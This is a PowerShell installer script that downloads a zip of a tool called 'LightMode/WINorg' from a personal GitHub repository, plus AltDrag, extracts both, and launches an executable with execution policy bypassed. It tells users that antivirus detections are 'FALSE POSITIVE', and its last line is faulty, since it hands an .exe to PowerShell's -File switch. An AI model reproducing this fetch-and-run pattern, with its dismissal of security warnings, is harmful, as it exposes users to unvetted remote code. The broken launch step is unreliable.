param([string]$Target = "User")
$AppName = "LightMode"
$AppName2 = "altdrag"
$InstallDir = "$env:LOCALAPPDATA\EXELIGHT"
$ZipPath = "$env:TEMP\$AppName.zip"
$ZipPath2 = "$env:TEMP\$AppName2.zip"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "this program may require administrator privileges." -ForegroundColor Yellow
    Write-Host "   Consider re-running this script 'As Administrator' if installation fails."
    Start-Sleep -Seconds 3
}
Write-Host "Greetings, $Target!" -ForegroundColor Magenta
Write-Host "WARNING THIS PS1 SCRIPT WILL INSTALL SOME programs in your PC" -ForegroundColor DarkRed
$choice = Read-Host "Do you want to continue? (Y/N)"
if ($choice -notlike "Y*" -and $choice -notlike "y*") {
    Write-Host "Operation cancelled by user." -ForegroundColor Yellow
    return
}
Write-Host "Proceeding with installation..." -ForegroundColor Green
Start-Sleep 4
Write-Host "installing WINorg (X server like display manager for windows) or official named = lightmode" -ForegroundColor Green
Write-Host "NONE OF THESE FILES ARE VIRUSES ITS FALSE POSITIVE" -ForegroundColor Green
try {
    Write-Host "Downloading WINorg..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://github.com/nikere/normalscript/raw/main/lightmode.zip" -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Host "Error during installation: $_" -ForegroundColor Red
    Write-Host "   Please ensure you have internet access and sufficient permissions."
    exit 1
}
Start-Sleep 1
try {
    Write-Host "Downloading ALTdrag..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://github.com/stefansundin/altdrag/releases/download/v1.1/AltDrag-portable.zip" -OutFile $zipPath2 -UseBasicParsing
} catch {
    Write-Host "Error during installation: $_" -ForegroundColor Red
    Write-Host "   Please ensure you have internet access and sufficient permissions."
    exit 1
}
Start-Sleep 5
Write-Host "Extracting to $InstallDir..." -ForegroundColor Cyan
if (Test-Path $InstallDir) { Remove-Item -Recurse -Force $InstallDir }
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force
Expand-Archive -Path $ZipPath2 -DestinationPath $InstallDir -Force
Remove-Item $ZipPath2 -Force
$choice = Read-Host "Do you want run WINorg? (Y/N)"
if ($choice -notlike "Y*" -and $choice -notlike "y*") {
    Write-Host "Operation cancelled by user." -ForegroundColor Yellow
    return
}
Write-Host "Launching $AppName..." -ForegroundColor Green
PowerShell -NoProfile -ExecutionPolicy Bypass -File "$InstallDir/lightmode/lightmode.exe"